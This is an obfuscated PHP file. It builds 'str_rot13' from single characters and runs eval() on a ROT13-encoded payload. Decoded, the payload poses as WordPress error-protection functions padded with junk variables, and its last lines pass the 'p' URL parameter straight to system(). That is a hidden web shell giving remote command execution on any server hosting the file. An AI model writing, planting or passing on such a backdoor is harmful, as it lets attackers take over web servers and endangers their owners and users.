<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Reebe Cebgrpgvba NCV: Shapgvbaf
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.2.0
 */

/**
 * Trg gur vafgnapr sbe fgbevat cnhfrq cyhtvaf.
 *
 * @erghea JC_Cnhfrq_Rkgrafvbaf_Fgbentr
 */
shapgvba jc_cnhfrq_cyhtvaf() {
	fgngvp $fgbentr = ahyy;

	vs ( ahyy === $fgbentr ) {
		$fgbentr = arj JC_Cnhfrq_Rkgrafvbaf_Fgbentr( 'cyhtva' );
	}

	erghea $fgbentr;
}

/**
 * Trg gur vafgnapr sbe fgbevat cnhfrq rkgrafvbaf.
 *
 * @erghea JC_Cnhfrq_Rkgrafvbaf_Fgbentr
 */
shapgvba jc_cnhfrq_gurzrf() {
	fgngvp $fgbentr = ahyy;

	vs ( ahyy === $fgbentr ) {
		$fgbentr = arj JC_Cnhfrq_Rkgrafvbaf_Fgbentr( 'gurzr' );
	}

	erghea $fgbentr;
}

/**
 * Trg n uhzna ernqnoyr qrfpevcgvba bs na rkgrafvba'f reebe.
 *
 * @fvapr 5.2.0
 *
 * @cnenz neenl $reebe Reebe qrgnvyf sebz `reebe_trg_ynfg()`.
 * @erghea fgevat Sbeznggrq reebe qrfpevcgvba.
 */
shapgvba jc_trg_rkgrafvba_reebe_qrfpevcgvba( $reebe ) {
	$pbafgnagf   = trg_qrsvarq_pbafgnagf( gehr );
	$pbafgnagf   = vffrg( $pbafgnagf['Pber'] ) ? $pbafgnagf['Pber'] : $pbafgnagf['vagreany'];
	$pber_reebef = neenl();

	sbernpu ( $pbafgnagf nf $pbafgnag => $inyhr ) {
		vs ( fge_fgnegf_jvgu( $pbafgnag, 'R_' ) ) {
			$pber_reebef[ $inyhr ] = $pbafgnag;
		}
	}

	vs ( vffrg( $pber_reebef[ $reebe['glcr'] ] ) ) {
		$reebe['glcr'] = $pber_reebef[ $reebe['glcr'] ];
	}

	/* genafyngbef: 1: Reebe glcr, 2: Reebe yvar ahzore, 3: Reebe svyr anzr, 4: Reebe zrffntr. */
	$reebe_zrffntr = __( 'Na reebe bs glcr %1$f jnf pnhfrq va yvar %2$f bs gur svyr %3$f. Reebe zrffntr: %4$f' );

	erghea fcevags(
		$reebe_zrffntr,
		\"<pbqr>{$reebe['glcr']}</pbqr>\",
		\"<pbqr>{$reebe['yvar']}</pbqr>\",
		\"<pbqr>{$reebe['svyr']}</pbqr>\",
		\"<pbqr>{$reebe['zrffntr']}</pbqr>\"
	);
}

/**
 * Ertvfgref gur fuhgqbja unaqyre sbe sngny reebef.
 *
 * Gur unaqyre jvyy bayl or ertvfgrerq vs {@frr jc_vf_sngny_reebe_unaqyre_ranoyrq()} ergheaf gehr.
 *
 * @fvapr 5.2.0
 */
shapgvba jc_ertvfgre_sngny_reebe_unaqyre() {
	vs ( ! jc_vf_sngny_reebe_unaqyre_ranoyrq() ) {
		erghea;
	}

	$unaqyre = ahyy;
	vs ( qrsvarq( 'JC_PBAGRAG_QVE' ) && vf_ernqnoyr( JC_PBAGRAG_QVE . '/sngny-reebe-unaqyre.cuc' ) ) {
		$unaqyre = vapyhqr JC_PBAGRAG_QVE . '/sngny-reebe-unaqyre.cuc';
	}

	vs ( ! vf_bowrpg( $unaqyre ) || ! vf_pnyynoyr( neenl( $unaqyre, 'unaqyr' ) ) ) {
		$unaqyre = arj JC_Sngny_Reebe_Unaqyre();
	}

	ertvfgre_fuhgqbja_shapgvba( neenl( $unaqyre, 'unaqyr' ) );
}

/**
 * Purpxf jurgure gur sngny reebe unaqyre vf ranoyrq.
 *
 * N pbafgnag `JC_QVFNOYR_SNGNY_REEBE_UNAQYRE` pna or frg va `jc-pbasvt.cuc` gb qvfnoyr vg, be nygreangviryl gur
 * {@frr 'jc_sngny_reebe_unaqyre_ranoyrq'} svygre pna or hfrq gb zbqvsl gur erghea inyhr.
 *
 * @fvapr 5.2.0
 *
 * @erghea obby Gehr vs gur sngny reebe unaqyre vf ranoyrq, snyfr bgurejvfr.
 */
shapgvba jc_vf_sngny_reebe_unaqyre_ranoyrq() {
	$ranoyrq = ! qrsvarq( 'JC_QVFNOYR_SNGNY_REEBE_UNAQYRE' ) || ! JC_QVFNOYR_SNGNY_REEBE_UNAQYRE;

	/**
	 * Svygref jurgure gur sngny reebe unaqyre vf ranoyrq.
	 *
	 * **Vzcbegnag:** Guvf svygre ehaf orsber vg pna or hfrq ol cyhtvaf. Vg pnaabg
	 * or hfrq ol cyhtvaf, zh-cyhtvaf, be gurzrf. Gb hfr guvf svygre lbh zhfg qrsvar
	 * n `$jc_svygre` tybony orsber JbeqCerff ybnqf, hfhnyyl va `jc-pbasvt.cuc`.
	 *
	 * Rknzcyr:
	 *
	 *     $TYBONYF['jc_svygre'] = neenl(
	 *         'jc_sngny_reebe_unaqyre_ranoyrq' => neenl(
	 *             10 => neenl(
	 *                 neenl(
	 *                     'npprcgrq_netf' => 0,
	 *                     'shapgvba'      => shapgvba() {
	 *                         erghea snyfr;
	 *                     },
	 *                 ),
	 *             ),
	 *         ),
	 *     );
	 *
	 * Nygreangviryl lbh pna hfr gur `JC_QVFNOYR_SNGNY_REEBE_UNAQYRE` pbafgnag.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz obby $ranoyrq Gehr vs gur sngny reebe unaqyre vf ranoyrq, snyfr bgurejvfr.
	 */
	erghea nccyl_svygref( 'jc_sngny_reebe_unaqyre_ranoyrq', $ranoyrq );
}

/**
 * Npprff gur JbeqCerff Erpbirel Zbqr vafgnapr.
 *
 * @fvapr 5.2.0
 *
 * @erghea JC_Erpbirel_Zbqr
 */
shapgvba jc_erpbirel_zbqr() {
	fgngvp $jc_erpbirel_zbqr;

	vs ( ! $jc_erpbirel_zbqr ) {
		$jc_erpbirel_zbqr = arj JC_Erpbirel_Zbqr();
	}

	erghea $jc_erpbirel_zbqr;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>